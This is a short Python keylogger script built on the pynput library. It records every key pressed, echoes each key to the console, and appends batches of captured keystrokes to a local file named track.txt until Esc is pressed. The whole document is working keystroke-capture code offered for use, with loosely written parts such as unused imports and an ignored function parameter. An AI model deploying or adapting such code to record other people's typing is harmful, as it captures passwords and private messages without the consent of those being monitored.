Need up-to-date pip installed
# Must have pynput installed a

from pynput.keyboard import Key, Controller

from multiprocessing.dummy.connection import Listener
import pynput

from pynput import keyboard
import sys

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    # every 15 keys that are pressed the file will update
    if count >=15:
        count = 0
        write_file(keys)
        keys = []



# function used so that  everytime a space is pressed on the keyboard the text file will enter a new line.
# When a special character is pressed it will show the character instead of a textual format
def write_file(key):
    with open("track.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

# Once the escape key is pressed the program will stop running

def on_release(key):
    if key == Key.esc:
        return False


# Loop used to collect keys pressed on the keyboard
with keyboard.Listener( on_press=on_press, on_release=on_release) as listener:
    listener.join()
